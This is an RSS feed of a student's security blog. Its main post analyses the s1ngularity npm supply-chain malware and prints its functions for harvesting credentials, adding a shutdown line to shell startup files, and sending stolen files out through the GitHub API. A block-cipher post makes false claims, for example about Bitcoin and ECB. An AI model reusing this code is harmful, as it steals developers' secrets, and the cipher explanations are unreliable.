@@ -1,0 +1,533 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Posts on Tane H. Blog</title>
+    <link>http://localhost:1313/posts/</link>
+    <description></description>
+    <generator>Hugo</generator>
+    <language>en</language>
+    <lastBuildDate>Fri, 05 Sep 2025 00:00:00 +0000</lastBuildDate>
+    <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>S1ngularity Malware</title>
+      <link>http://localhost:1313/posts/s1ngularity/</link>
+      <pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/s1ngularity/</guid>
+      <description>&lt;p&gt;I found out about the malware called S1ngularity. This is my writeup on it.&lt;/p&gt;</description>
+      <content:encoded>&lt;p&gt;I found out about the malware called S1ngularity. This is my writeup on it.&lt;/p&gt;
+&lt;h1 id=&#34;analyzing-the-s1ngularity-malware&#34;&gt;Analyzing the &lt;em&gt;s1ngularity&lt;/em&gt; Malware&lt;/h1&gt;
+&lt;p&gt;So recently, I examined a Node.js–based malware sample called &lt;strong&gt;&lt;code&gt;s1ngularity&lt;/code&gt;&lt;/strong&gt;, which showcases how attackers can abuse JavaScript tooling ecosystems to steal secrets and dump them anonymously.&lt;/p&gt;
+&lt;p&gt;The &lt;strong&gt;S1ngularity&lt;/strong&gt; malware is a Node.js–based threat that demonstrates how supply-chain attacks can compromise developers’ machines, steal secrets, and exfiltrate data via legitimate platforms.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;s1ngularity&lt;/code&gt; executes on UNIX-like systems and deliberately exits on Windows hosts.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;non-technical-overview&#34;&gt;Non-Technical Overview&lt;/h2&gt;
+&lt;p&gt;In late August 2025, a widely-used software tool for developers called &lt;strong&gt;Nx&lt;/strong&gt; was briefly compromised in what is known as a &lt;strong&gt;supply-chain attack&lt;/strong&gt;. Instead of directly attacking users, the perpetrators managed to publish malicious versions of Nx that could secretly steal sensitive information from the computers of developers who installed them.&lt;/p&gt;
+&lt;p&gt;The malware, named &lt;strong&gt;S1ngularity&lt;/strong&gt;, targeted computers running Linux or macOS, looking for private keys, wallet files, and access tokens—information that could allow attackers to access online accounts, cryptocurrency wallets, or software repositories. It could also disrupt users by forcing their computers to shut down automatically.&lt;/p&gt;
+&lt;p&gt;Nx maintainers responded quickly. Within hours, the malicious packages were removed, publishing tokens were revoked, and guidance was issued to help developers clean their systems. Despite the rapid response, the attack affected thousands of developers worldwide and demonstrated how even trusted software tools can be used as a vector to compromise sensitive data.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Key Points:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Attackers used the &lt;strong&gt;trust in Nx packages&lt;/strong&gt; to reach developers.&lt;/li&gt;
+&lt;li&gt;Malware exfiltrated data silently to public repositories.&lt;/li&gt;
+&lt;li&gt;Developers and organizations had to rotate credentials and audit systems to recover.&lt;/li&gt;
+&lt;li&gt;The incident highlights the importance of &lt;strong&gt;supply-chain security&lt;/strong&gt; and monitoring of software dependencies.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;how-the-malware-spread-nx-supply-chain-attack&#34;&gt;How the Malware Spread: Nx Supply-Chain Attack&lt;/h2&gt;
+&lt;p&gt;The initial infection vector was a &lt;strong&gt;compromise of the Nx JavaScript/TypeScript tooling ecosystem&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Attackers some how obtained a publishing token for the npm account used by Nx maintainers. The method and date are unknown as of current.&lt;/li&gt;
+&lt;li&gt;Attackers published &lt;strong&gt;malicious versions of &lt;code&gt;nx&lt;/code&gt; and &lt;code&gt;@nx/*&lt;/code&gt; packages&lt;/strong&gt; to the npm registry on August 26–27, 2025.&lt;/li&gt;
+&lt;li&gt;These packages executed &lt;strong&gt;post-install scripts&lt;/strong&gt; that scanned developer machines and CI environments for sensitive files, tokens, and configuration secrets.&lt;/li&gt;
+&lt;li&gt;Because Nx is widely used in &lt;strong&gt;monorepos and CI/CD pipelines&lt;/strong&gt;, automated installs during this window could trigger the malware.&lt;/li&gt;
+&lt;li&gt;This method is a classic &lt;strong&gt;supply-chain attack&lt;/strong&gt;, where the threat spreads through trusted software dependencies rather than direct phishing or malware downloads.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;how-nx-was-compromised&#34;&gt;How Nx Was Compromised&lt;/h2&gt;
+&lt;p&gt;GitHub advisory comments and investigations revealed the mechanism:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Attackers obtained a token that allowed them to publish packages, even though maintainers had 2FA enabled. npm did not enforce 2FA for publishing at the time.&lt;/li&gt;
+&lt;li&gt;The attackers pushed multiple poisoned builds over a short period.&lt;/li&gt;
+&lt;li&gt;Luckily Nx maintainers coordinated with npm and security teams to remove malicious packages, rotate credentials, and publish guidance for affected users.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The malware targeted Linux/macOS environments, performing reconnaissance, harvesting wallet files and private keys, and using any available GitHub token to &lt;strong&gt;create public repositories (&lt;code&gt;s1ngularity-repository&lt;/code&gt;)&lt;/strong&gt; for exfiltrating stolen data.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;the-script&#34;&gt;The Script&lt;/h2&gt;
+&lt;p&gt;The script was basic. Below is the Technical Overview&lt;/p&gt;
+&lt;h3 id=&#34;malicious-actions&#34;&gt;Malicious Actions&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Wallet/Key Harvesting&lt;/strong&gt;&lt;br&gt;
+Recursively searches sensitive directories (&lt;code&gt;$HOME&lt;/code&gt;, &lt;code&gt;.config&lt;/code&gt;, &lt;code&gt;.local/share&lt;/code&gt;, &lt;code&gt;.ethereum&lt;/code&gt;, &lt;code&gt;.electrum&lt;/code&gt;, &lt;code&gt;/etc&lt;/code&gt;, &lt;code&gt;/tmp&lt;/code&gt;) for:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Keystores (&lt;code&gt;UTC--&lt;/code&gt;, &lt;code&gt;keystore.json&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Cryptocurrency wallets (Metamask, Electrum, Ledger, Trezor, Exodus, Phantom, Solflare, Trust Wallet)&lt;/li&gt;
+&lt;li&gt;Private keys (&lt;code&gt;id_rsa&lt;/code&gt;, &lt;code&gt;.secret&lt;/code&gt;, &lt;code&gt;secrets.json&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Environment files (&lt;code&gt;.env&lt;/code&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;System Reconnaissance&lt;/strong&gt;&lt;br&gt;
+Collects system details:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hostname, platform, OS type/release&lt;/li&gt;
+&lt;li&gt;Environment variables&lt;/li&gt;
+&lt;li&gt;Installed CLI tools (&lt;code&gt;claude&lt;/code&gt;, &lt;code&gt;gemini&lt;/code&gt;, &lt;code&gt;q&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;GitHub CLI tokens&lt;/li&gt;
+&lt;li&gt;NPM account info (&lt;code&gt;npm whoami&lt;/code&gt; and &lt;code&gt;.npmrc&lt;/code&gt; content)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Persistence &amp;amp; Disruption&lt;/strong&gt;&lt;br&gt;
+Appends:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo shutdown -h 0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;to shell initialization files (&lt;code&gt;.bashrc&lt;/code&gt;, &lt;code&gt;.zshrc&lt;/code&gt;), forcing the system to shut down on login.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Data Exfiltration&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Files are &lt;strong&gt;Base64-encoded&lt;/strong&gt; into &lt;code&gt;/tmp/inventory.txt&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;If a &lt;strong&gt;GitHub token&lt;/strong&gt; is found, the malware creates a public repository named &lt;code&gt;s1ngularity-repository&lt;/code&gt; and uploads the stolen data as &lt;code&gt;results.b64&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;core-functions&#34;&gt;Core Functions&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;isOnPathSync(cmd)&lt;/code&gt; → Detects installed CLI tools&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// Action based on OS.
+function isOnPathSync(cmd) {
+  const whichCmd = process.platform === &amp;#39;win32&amp;#39; ? &amp;#39;where&amp;#39; : &amp;#39;which&amp;#39;;
+  try {
+    const r = spawnSync(whichCmd, [cmd], { stdio: [&amp;#39;ignore&amp;#39;, &amp;#39;pipe&amp;#39;, &amp;#39;ignore&amp;#39;] });
+    return r.status === 0 &amp;amp;&amp;amp; r.stdout &amp;amp;&amp;amp; r.stdout.toString().trim().length &amp;gt; 0;
+  } catch {
+    return false;
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;runBackgroundSync(cmd, args)&lt;/code&gt; → Executes background commands and captures output&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// Sync with background.
+function runBackgroundSync(cmd, args, maxBytes = 200000, timeout = 200000) {
+  try {
+    const r = spawnSync(cmd, args, { encoding: &amp;#39;utf8&amp;#39;, stdio: [&amp;#39;ignore&amp;#39;, &amp;#39;pipe&amp;#39;, &amp;#39;pipe&amp;#39;], timeout });
+    const out = (r.stdout || &amp;#39;&amp;#39;) + (r.stderr || &amp;#39;&amp;#39;);
+    return { exitCode: r.status, signal: r.signal, output: out.slice(0, maxBytes) };
+  } catch (err) {
+    return { error: String(err) };
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;forceAppendAgentLine()&lt;/code&gt; → Appends shutdown command for persistence&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// Force file to shutdown on login. (Only for user account being used).
+function forceAppendAgentLine() {
+  const home = process.env.HOME || os.homedir();
+  const files = [&amp;#39;.bashrc&amp;#39;, &amp;#39;.zshrc&amp;#39;];
+  const line = &amp;#39;sudo shutdown -h 0&amp;#39;;
+  for (const f of files) {
+    const p = path.join(home, f);
+    try {
+      const prefix = fs.existsSync(p) ? &amp;#39;\n&amp;#39; : &amp;#39;&amp;#39;;
+      fs.appendFileSync(p, prefix + line + &amp;#39;\n&amp;#39;, { encoding: &amp;#39;utf8&amp;#39; });
+      result.appendedFiles.push(p);
+    } catch (e) {
+      result.appendedFiles.push({ path: p, error: String(e) });
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;githubRequest(pathname, method, body, token)&lt;/code&gt; → Handles GitHub API requests for repo creation/data upload&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// Sends a request to github to upload some content for a local git repository.
+function githubRequest(pathname, method, body, token) {
+  return new Promise((resolve, reject) =&amp;gt; {
+    const b = body ? (typeof body === &amp;#39;string&amp;#39; ? body : JSON.stringify(body)) : null;
+    const opts = {
+      hostname: &amp;#39;api.github.com&amp;#39;,
+      path: pathname,
+      method,
+      headers: Object.assign({
+        &amp;#39;Accept&amp;#39;: &amp;#39;application/vnd.github.v3+json&amp;#39;,
+        &amp;#39;User-Agent&amp;#39;: &amp;#39;axios/1.4.0&amp;#39;
+      }, token ? { &amp;#39;Authorization&amp;#39;: `Token ${token}` } : {})
+    };
+    if (b) {
+      opts.headers[&amp;#39;Content-Type&amp;#39;] = &amp;#39;application/json&amp;#39;;
+      opts.headers[&amp;#39;Content-Length&amp;#39;] = Buffer.byteLength(b);
+    }
+    const req = https.request(opts, (res) =&amp;gt; {
+      let data = &amp;#39;&amp;#39;;
+      res.setEncoding(&amp;#39;utf8&amp;#39;);
+      res.on(&amp;#39;data&amp;#39;, (c) =&amp;gt; (data += c));
+      res.on(&amp;#39;end&amp;#39;, () =&amp;gt; {
+        const status = res.statusCode;
+        let parsed = null;
+        try { parsed = JSON.parse(data || &amp;#39;{}&amp;#39;); } catch (e) { parsed = data; }
+        if (status &amp;gt;= 200 &amp;amp;&amp;amp; status &amp;lt; 300) resolve({ status, body: parsed });
+        else reject({ status, body: parsed });
+      });
+    });
+    req.on(&amp;#39;error&amp;#39;, (e) =&amp;gt; reject(e));
+    if (b) req.write(b);
+    req.end();
+  });
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;processFile(listPath)&lt;/code&gt; → Reads inventory, Base64-encodes file contents, and stages them for exfiltration&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  // Read /tmp/inventory.txt, get file contents, and return it in b64.
+  async function processFile(listPath = &amp;#39;/tmp/inventory.txt&amp;#39;) {
+    const out = [];
+    let data;
+    try {
+      data = await fs.promises.readFile(listPath, &amp;#39;utf8&amp;#39;);
+    } catch (e) {
+      return out;
+    }
+    const lines = data.split(/\r?\n/);
+    for (const rawLine of lines) {
+      const line = rawLine.trim();
+      if (!line) continue;
+      try {
+        const stat = await fs.promises.stat(line);
+        if (!stat.isFile()) continue;
+      } catch {
+        continue;
+      }
+      try {
+        const buf = await fs.promises.readFile(line);
+        out.push(buf.toString(&amp;#39;base64&amp;#39;));
+      } catch { }
+    }
+    return out;
+  }
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h2 id=&#34;impact-of-the-attack&#34;&gt;Impact of the Attack&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Secrets compromised&lt;/strong&gt;: Thousands of items including GitHub tokens (~1,000+), SSH keys, wallet files, &lt;code&gt;.env&lt;/code&gt; files, and NPM credentials.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Wide reach&lt;/strong&gt;: Hundreds of developers/organizations initially identified, expanding to thousands of repositories and hundreds of GitHub accounts.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;High-value targeting&lt;/strong&gt;: Wallets, SSH keys, and developer tokens were primary targets.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Stealth exfiltration&lt;/strong&gt;: Using victims’ GitHub accounts reduced detection risk.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CI/CD contamination&lt;/strong&gt;: Malware could execute in automated pipelines, amplifying potential impact.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;threat-level--threat-intelligence-context&#34;&gt;Threat Level &amp;amp; Threat Intelligence Context&lt;/h2&gt;
+&lt;p&gt;On a &lt;strong&gt;threat scale&lt;/strong&gt;, S1ngularity sits at a &lt;strong&gt;hig impact level&lt;/strong&gt; due to:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Supply-chain leverage&lt;/strong&gt;: It compromises trusted developer tooling that many organizations automatically install.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Silent exfiltration&lt;/strong&gt;: Data is sent through legitimate channels (GitHub), bypassing many conventional security monitoring systems.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Persistence &amp;amp; disruption&lt;/strong&gt;: Forced shutdowns and credential harvesting amplify operational and security risks.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Target specificity&lt;/strong&gt;: Focuses on developers and crypto users, which are high-value targets for attackers.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Attack difficulty&lt;/strong&gt;: Moderate — requires access to a publishing token, but the payload itself is simple Node.js and does not rely on advanced exploits.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;From a &lt;strong&gt;threat intelligence perspective&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Security teams should monitor &lt;strong&gt;npm ecosystems&lt;/strong&gt; for anomalous package versions or unexpected releases.&lt;/li&gt;
+&lt;li&gt;Organizations should integrate &lt;strong&gt;CI/CD secret scanning&lt;/strong&gt;, track &lt;strong&gt;public GitHub repository creation&lt;/strong&gt;, and audit &lt;strong&gt;developer token usage&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;Monitoring for &lt;strong&gt;supply-chain compromises&lt;/strong&gt; in widely-used developer tools is critical, as attacks like S1ngularity can have cascading effects across organizations.&lt;/li&gt;
+&lt;li&gt;Intelligence sharing among security vendors and developer communities is essential to rapidly detect and mitigate similar attacks.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;The &lt;em&gt;s1ngularity&lt;/em&gt; malware demonstrates how a Node.js script can:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Exploit trusted developer tooling (Nx supply-chain)&lt;/li&gt;
+&lt;li&gt;Compromise sensitive credentials via a stolen publishing token&lt;/li&gt;
+&lt;li&gt;Exfiltrate data silently to GitHub&lt;/li&gt;
+&lt;li&gt;Force persistence and disruption through login shutdowns&lt;/li&gt;
+&lt;/ol&gt;</content:encoded>
+    </item>
+    
+    <item>
+      <title>Block Ciphers - Part 1</title>
+      <link>http://localhost:1313/posts/blockciphers/</link>
+      <pubDate>Sun, 31 Aug 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/blockciphers/</guid>
+      <description>&lt;p&gt;One day a man named Tane was bored in a plane with Wifi. What did he do? He read an academic paper on Block Ciphers.&lt;/p&gt;</description>
+      <content:encoded>&lt;p&gt;One day a man named Tane was bored in a plane with Wifi. What did he do? He read an academic paper on Block Ciphers.&lt;/p&gt;
+&lt;p&gt;So yeah, I was in a plane today going home and was just reading on block ciphers with the intent to learn blockchain hacking. For those not well adversed in hacking, NO I AM NOT GOING TO USE THIS WITH ILL INTENT. Anyway with the disclaimer done, let&amp;rsquo;s get right in.&lt;/p&gt;
+&lt;p&gt;So I&amp;rsquo;m going to use this website as an opportunity to explain what I learned while on the plane. I will cover ECB(Electronic Code Book), CBC(Cipher Block Chaining), and a tiny bit of CTR(Counter Mode) which I didn&amp;rsquo;t understand very well.&lt;/p&gt;
+&lt;h1 id=&#34;the-content&#34;&gt;The content&lt;/h1&gt;
+&lt;h2 id=&#34;so-whats-a-cipher&#34;&gt;So what&amp;rsquo;s a cipher?&lt;/h2&gt;
+&lt;p&gt;A cipher is a method used to encrypt or decrypt messages.&lt;/p&gt;
+&lt;h2 id=&#34;so-whats-a-ciphertext&#34;&gt;So what&amp;rsquo;s a ciphertext?&lt;/h2&gt;
+&lt;p&gt;A ciphertext is the result of a plaintext being passed through a cipher.&lt;/p&gt;
+&lt;h2 id=&#34;whats-a-block-in-block-cipher&#34;&gt;What&amp;rsquo;s a block in block cipher?&lt;/h2&gt;
+&lt;p&gt;It&amp;rsquo;s a &amp;lsquo;block&amp;rsquo; of bits. Say you are encrypting a plaintext message, you would split it into blocks of x size, usually 16 bytes to mass encrypt large amounts of plaintext. If the plaintext is too short to fill in the last block, the plaintext is usually padded to be 0 when modulused by the length.&lt;/p&gt;
+&lt;h2 id=&#34;whats-an-encryption-key&#34;&gt;What&amp;rsquo;s an encryption key?&lt;/h2&gt;
+&lt;p&gt;It&amp;rsquo;s the key used for encryption. Woah! :0.&lt;/p&gt;
+&lt;h2 id=&#34;whats-a-round-key&#34;&gt;What&amp;rsquo;s a round key?&lt;/h2&gt;
+&lt;p&gt;It&amp;rsquo;s a key determined from the encryption key used to encrypt the plaintext in &amp;lsquo;rounds&amp;rsquo;.&lt;br&gt;
+E.G. AES128 has 10 rounds of encryption meaning each block is encrypted using 10 different round keys&lt;/p&gt;
+&lt;h2 id=&#34;whats-an-iv&#34;&gt;What&amp;rsquo;s an IV?&lt;/h2&gt;
+&lt;p&gt;This had been a great mystery for me until today. It&amp;rsquo;s the initialization vector. For vectors which need a starting encryption value to xor the plaintext it is used(later discussed in CBC description if I don&amp;rsquo;t forget).&lt;/p&gt;
+&lt;h2 id=&#34;whats-a-spm&#34;&gt;What&amp;rsquo;s a SPM&lt;/h2&gt;
+&lt;p&gt;A SPM, or Substitution-Permutation Cipher is the fundemental design structure for the ciphers such as aes.&lt;/p&gt;
+&lt;h2 id=&#34;whats-a-s-box&#34;&gt;What&amp;rsquo;s a S-Box&lt;/h2&gt;
+&lt;p&gt;It&amp;rsquo;s a box with multiple operations to encrypt/decrypt the input with a key.&lt;/p&gt;
+&lt;h2 id=&#34;what-is-electronic-codebook-ecb&#34;&gt;What is Electronic Codebook, ECB&lt;/h2&gt;
+&lt;p&gt;ECB has a separate encryption process to decryption, but honestly, it&amp;rsquo;s just reversing it. Takes up more space though.&lt;/p&gt;
+&lt;p&gt;It takes 16 bit cipher blocks and encrypts them by passing them through the S-Box.&lt;br&gt;
+The S-Box gets sent the cipher-key, and plaintext(or ciphertext) to decrypt, and the round key is usually generated inside the S-Box. Diagrams are online.&lt;/p&gt;
+&lt;p&gt;Vulnerabilities: Frequency analysis. AES-ECB is a Symetric Cipher so needs to be Decryptable with the same key it is Encrypted with. Therefore each plaintext always creates the same ciphertext. So for example the block b&amp;rsquo;apple_apple_appl&amp;rsquo; would always become the same ciphertext after encryption. If for example this mode is used to encrypt large volumes of real sentences, frequency analysis may be used to find the values of which each block is, or at least which ones are the same as each other. The same method can also be used to determine whether the cipher is AES-ECB mode or not, which can reveal unnecessary information.&lt;/p&gt;
+&lt;p&gt;ECB is useful in random values such as keys when transfering keys for RSA over the internet as it is faster pased than CBC.&lt;/p&gt;
+&lt;h2 id=&#34;what-is-cipher-block-chain-cbc&#34;&gt;What is Cipher Block Chain, CBC&lt;/h2&gt;
+&lt;p&gt;In Cipher Block Chain is a ECB except with extra steps and chaining. Diagrams are online.&lt;br&gt;
+What is happening is that the previous blocks ciphertext is xored with the new plaintext before it is passed into the S-Box. Thus the chaining. Since each block gets xored, you can&amp;rsquo;t frequency analyse it like you can with ECB, each block relys on the output of the previous.&lt;/p&gt;
+&lt;p&gt;One well known usage of this is in Bitcoin. Each block is a AES-CBC key, literally.&lt;/p&gt;
+&lt;p&gt;So, what about the first ciphertext value used in the xor. This is what the IV(Initialization Value) is for. It is used as the first ciphertext.&lt;/p&gt;
+&lt;h2 id=&#34;what-is-counter-mode-ctr&#34;&gt;What is Counter Mode, CTR&lt;/h2&gt;
+&lt;p&gt;I read about this, but at this point I was getting ready to go to sleep so I wasn&amp;rsquo;t too sure. Effectively though, it&amp;rsquo;s space efficient, and you can use it for encryption and decryption unlike the other two modes I mentioned which you need different functions for.&lt;/p&gt;
+&lt;h3 id=&#34;what-it-took-you-11-hours-to-understand-this&#34;&gt;What it took you 11+ hours to understand this?&lt;/h3&gt;
+&lt;p&gt;To this I will say no. I slept for 5-6 hours, was helping an old man next to me crumbling under air pressure, and doing my weekend CTF challenges as a side quest.&lt;/p&gt;
+&lt;p&gt;Also yes I have learned more, this is just part one because I am writing this at night.&lt;/p&gt;
+&lt;h3 id=&#34;how-do-i-find-the-article&#34;&gt;How do I find the article&lt;/h3&gt;
+&lt;p&gt;For people who want to check the article out &lt;a href=&#34;https://eprint.iacr.org/2020/1545&#34;&gt;click here!&lt;/a&gt;&lt;/p&gt;</content:encoded>
+    </item>
+    
+    <item>
+      <title>Coorporate Network Pentesting, Logan Woods</title>
+      <link>http://localhost:1313/posts/activedirectory/</link>
+      <pubDate>Sun, 10 Aug 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/activedirectory/</guid>
+      <description>&lt;p&gt;This talk was an introduction to AD(Active Directory), where Logan teaches us about this through some experiences he has had in the past.&lt;/p&gt;</description>
+      <content:encoded>&lt;p&gt;This talk was an introduction to AD(Active Directory), where Logan teaches us about this through some experiences he has had in the past.&lt;/p&gt;
+&lt;h1 id=&#34;the-event&#34;&gt;The event&lt;/h1&gt;
+&lt;p&gt;We had a lot more people this time. The number of participants was 30+, and we were not prepared for it. Half of our organisors were either sick or away(AKA the foreshadowing). And not only that AD is a very advanced topic, and we didn&amp;rsquo;t properly advertise for intermediate people, so we could not get around to everyone during the lab.&lt;/p&gt;
+&lt;h2 id=&#34;what-i-learned-from-this&#34;&gt;What I learned from this&lt;/h2&gt;
+&lt;p&gt;So many things to learn from this one, I&amp;rsquo;m going to bullet point them.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Make sure to not get tiny pizzas. People are hungry.&lt;/li&gt;
+&lt;li&gt;Try not to let the speaker speak for more than an hour, preferably not more than 45 minutes.&lt;/li&gt;
+&lt;li&gt;Make sure to have more organisers in preperation for lots of people turning up.&lt;/li&gt;
+&lt;li&gt;Maybe tell people when labs are advanced? And definitely tell them to set up their computer.&lt;/li&gt;
+&lt;li&gt;We did not have GOAD(an AD lab) ready, and had to go to a HTB Lab Machine which was not retired. We needed to prepare this much earlier.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I think this was a good learning experience, but I do think we lost a bit from having people leave from the difficulty and lack of support. I hope we can fix this for our next talk on Cryptology, by a high school student, Ethan.&lt;/p&gt;</content:encoded>
+    </item>
+    
+    <item>
+      <title>Python Garbage Collection Optimisation, Tane Haines</title>
+      <link>http://localhost:1313/posts/pythongarbagecollection/</link>
+      <pubDate>Thu, 24 Jul 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/pythongarbagecollection/</guid>
+      <description>&lt;p&gt;Yes, I did my second talk, in front of dozens of people. It was on Optimising the Python Garbage Collector. It was for Wellington Python Meetup.&lt;/p&gt;</description>
+      <content:encoded>&lt;p&gt;Yes, I did my second talk, in front of dozens of people. It was on Optimising the Python Garbage Collector. It was for Wellington Python Meetup.&lt;/p&gt;
+&lt;h1 id=&#34;the-presentation&#34;&gt;The presentation&lt;/h1&gt;
+&lt;p&gt;The topic was an introduction to how memory is managed and stored in python, and how the Garbage Collector works. I gave a  few small tips on real world usages of the GC but I feel like the talk after the presentation was longer. Lots of people asked questions and I was bombarded.&lt;/p&gt;
+&lt;h2 id=&#34;what-i-learned-from-this&#34;&gt;What I learned from this&lt;/h2&gt;
+&lt;p&gt;I believe I need to prepare for questions more. I was able to answer some, but there were some actually hard questions out there which I feel I could have answered had I done more research.&lt;/p&gt;
+&lt;p&gt;This was the week I was extra busy so I was quite stressed but finishing this talk and the one on reverse engineering was a very, very, big relief.&lt;/p&gt;
+&lt;p&gt;Unfortunately I don&amp;rsquo;t think there is a video of this online, but if you search up the July meetup on meetup.com you can find my name on there.&lt;/p&gt;</content:encoded>
+    </item>
+    
+    <item>
+      <title>Reverse Engineering, Tane Haines(Yes, me)</title>
+      <link>http://localhost:1313/posts/reverseengineeringtalk/</link>
+      <pubDate>Mon, 21 Jul 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/reverseengineeringtalk/</guid>
+      <description>&lt;p&gt;Yes, I did my first talk, in front of dozens of people. It was on reverse engineering. It was for VuwCTF the Cyber Security Club at VUW.&lt;/p&gt;</description>
+      <content:encoded>&lt;p&gt;Yes, I did my first talk, in front of dozens of people. It was on reverse engineering. It was for VuwCTF the Cyber Security Club at VUW.&lt;/p&gt;
+&lt;h1 id=&#34;the-presentation&#34;&gt;The presentation&lt;/h1&gt;
+&lt;p&gt;The topic was more of an introductory one. I taught about history of reverse engineering, types of reverse engineering, what it is and why people do it, binary files, decompilers, disassemblers, debuggers, xor, etc. I also did a walk through of our first challenge, which as I am writing this after our second meetup, I am thinking that we should have done this for that event as well, as it was a much more difficult topic called AD(Active Directory).&lt;/p&gt;
+&lt;h2 id=&#34;what-i-learned-about-myself&#34;&gt;What I learned about myself&lt;/h2&gt;
+&lt;p&gt;During my speech I used too many filler words such as uhh. It would have been much better if I stayed silent when I was not sure what to say. I get that this is a basic skill, and I knew this was the case, but I didn&amp;rsquo;t realise it was this bad. I will link the presentation below so you know what I mean.&lt;/p&gt;
+&lt;p&gt;I also learned that I can properly teach if I prepare well in advance, as I do believe I did get some interesting content out to the students.&lt;/p&gt;
+&lt;h1 id=&#34;the-lab&#34;&gt;The Lab&lt;/h1&gt;
+&lt;p&gt;The lab was successful, we had enough volunteers for the number of people actually participating in the labs. I really do think we got quite a few people interested into Reverse Engineering through this.&lt;br&gt;
+One thing I&amp;rsquo;m happy about is that a few high schoolers came and learned about REV(In my opinion the best CTF Category(OO~~ an opinion~. Someones going to get mad at me.)). Nobody made it to the last challenge but someone got very close.&lt;/p&gt;
+&lt;h2 id=&#34;what-i-learned-from-this&#34;&gt;What I learned from this&lt;/h2&gt;
+&lt;p&gt;We may need more people in future events. We had all our committee members and it was hard to get around to everyone to help&amp;hellip; I hope this doesn&amp;rsquo;t become an issue in our next event(forshadowing).&lt;/p&gt;
